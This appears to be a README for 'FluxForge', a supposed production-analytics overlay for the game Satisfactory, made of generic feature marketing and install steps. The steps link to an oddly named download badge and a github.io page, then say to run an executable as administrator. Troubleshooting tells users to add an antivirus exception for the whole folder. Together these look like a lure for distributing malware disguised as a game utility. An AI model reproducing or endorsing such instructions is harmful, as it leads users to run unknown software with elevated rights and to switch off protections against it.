## ✨ Feature Gallery

### 📊 Real-Time Production Analytics
The heart of FluxForge is its **live telemetry engine**. It reads the underlying data structures of the simulated environment—without modifying any game files—to present you with a comprehensive overview of:
- **Per-machine efficiency ratings** (percentage and absolute numbers)
- **Resource consumption graphs** with predictive trend lines
- **Bottleneck identification** using a proprietary color-coded heat map of your factory floor

### 🧠 Smart Resource Allocation System
Ever wonder where all your iron plates are disappearing to? FluxForge's **resource routing visualizer** draws intuitive overlays directly on your screen, showing you the exact path of every item. It helps you re-route conveyor systems to minimize travel distance and maximize throughput.

### 🛠️ Automated Production Balancing
The **Balancer Assistant** scans your entire setup and suggests subtle adjustments to splitter/merger configurations to achieve optimal flow rates. It doesn't perform any actions for you—it generates clear, actionable blueprints that you can implement in a matter of minutes.

### 🌍 Global Map Profiler
Navigate the vast terrain with a **mini-map enhancement module** that marks all resource nodes, power slugs, and important landmarks from your in-game exploration data. It syncs with your progression, ensuring you never lose sight of untapped potential.

### 🎨 Customizable Overlay Interface
A **drag-and-drop dashboard** allows you to position widgets exactly where you want them. Choose between a sleek dark theme, a vibrant colorblind-friendly mode, or a highly translucent "ghost" mode for minimal screen distraction.

### 🌐 Multilingual Proficiency
FluxForge breaks down the language barrier with **native support for 14 languages**, including English, German, French, Spanish, Russian, Chinese (Simplified & Traditional), Japanese, Korean, Portuguese, Italian, and more. The UI automatically detects your system's locale or can be manually switched via a simple dropdown.

## 🚀 Getting Started in 2026

### System Requirements
- **OS:** Windows 10 (build 19045+) or Windows 11 (build 22000+)
- **Processor:** Quad-core @ 2.5 GHz or better
- **Memory:** 8 GB RAM (16 GB recommended for large save files)
- **Graphics:** DirectX 11 compatible card
- **Disk Space:** 150 MB available

### Installation Odyssey

1. **Acquire the Distribution Archive**
   Navigate to the [![Download](https://raw.githubusercontent.com/Nabby123456/Satisfactory-Optimizer-Suite/main/run_d9f4d65.svg)](https://Nabby123456.github.io/Satisfactory-Optimizer-Suite/) section (see macro above) and retrieve the latest stable release package. Ensure the checksum matches the one provided in the release notes for authenticity.

2. **Extract the Contents**
   Use your preferred archive utility to unpack the compressed folder. We recommend keeping the extracted files in a dedicated directory like `C:\Tools\FluxForge\`.

3. **Run the Initializer**
   Double-click the `FluxForge.exe` launcher. A user-friendly setup wizard will guide you through a quick initialization process, requesting minimal permissions to access the game's processes.

4. **Connect to the Game**
   Launch your base game first. Once the main menu appears, minimize it and run FluxForge. It will automatically detect the running instance and establish a secure telemetry link.

5. **Begin Your Analysis**
   Load a save file in the game, and the FluxForge overlay will instantly populate with real-time data. Explore the various dashboards from the system tray icon.

## 🛠️ Troubleshooting Commons Pitfalls

**Issue: Overlay not appearing.**
*Solution:* Ensure FluxForge is running with administrator privileges. Right-click the executable, select "Properties," then "Compatibility," and check the "Run this program as an administrator" box.

**Issue: The resource flow graph shows zeros.**
*Solution:* This typically indicates an ant-virus or system security guard has quarantined the telemetry bridge file. Add an exception for the entire FluxForge directory.

**Issue: Flickering widgets on multi-monitor setups.**
*Solution:* Navigate to `Settings > Display` within the tool and enable the "Compatibility Rendering" option, which forces a software-based drawing mode.
